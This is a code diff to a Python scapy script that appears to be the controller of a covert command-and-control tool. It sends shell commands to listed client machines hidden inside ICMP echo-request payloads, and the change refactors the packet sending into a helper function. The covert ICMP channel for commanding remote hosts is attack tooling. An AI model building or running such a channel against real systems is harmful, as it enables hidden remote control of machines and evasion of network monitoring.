@@ -2,9 +2,9 @@ from scapy.all import *
 from scapy.all import ICMP,IP
 import json
 
-DEBUG = True
-DEVDEBUG = True
-JSONFILE = "example.json"
+DEBUG = True                   # Set to display statements after command execution
+DEVDEBUG = True                # Set to display statements specific to debugging issues
+JSONFILE = "example.json"      # Set to point to configuration files with loadclients
 
 def print_help():
     print("\taddclient <IP_ADDRESS>   Adds new client by IP")
@@ -56,21 +56,23 @@ def send_command(arguments, clients):
         clientcommand = arguments[1] 
         clienttokens = clientcommand.split(" ", 1)
         if clients.get(int(clienttokens[0])) != None:
-
             if DEVDEBUG: print(len(clienttokens[1].encode('utf-8')))
             # if len(clienttokens[1].encode('utf-8')) > 1469:
             #     piece = clienttokens[1][:1469]
             #     segment = "!!!" + piece 
             segments = len(clienttokens[1].encode('utf-8'))//1469
             if DEVDEBUG: print(segments)
-
-            evil = IP(dst=clients.get(int(clienttokens[0])))/ICMP(type=8)/(clienttokens[1])
-            send(evil)
+            send_over_icmp(clients.get(int(clienttokens[0])), clienttokens[1])
             if DEBUG: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
         else:
             print(f"[ERROR] No client at ID {clienttokens[0]}")
     except:
         print("[ERROR] Usage: send <ID> <message>")
+
+# Reduced redundency in 
+def send_over_icmp(clientip, command):
+    evil = IP(dst=clientip)/ICMP(type=8)/(command)
+    send(evil)
 
 # Send command to all clients
 def sendtoall(arguments, clients):
@@ -78,9 +80,8 @@ def sendtoall(arguments, clients):
         print("[ERROR] Usage: sendtoall <message>")
     else:
         for client in clients:
-            evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
+            send_over_icmp(clients.get(client), arguments[1])
             if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
-            send(evil)
 
 # Place icupS into single client mode
 def shell(clients, arguments):
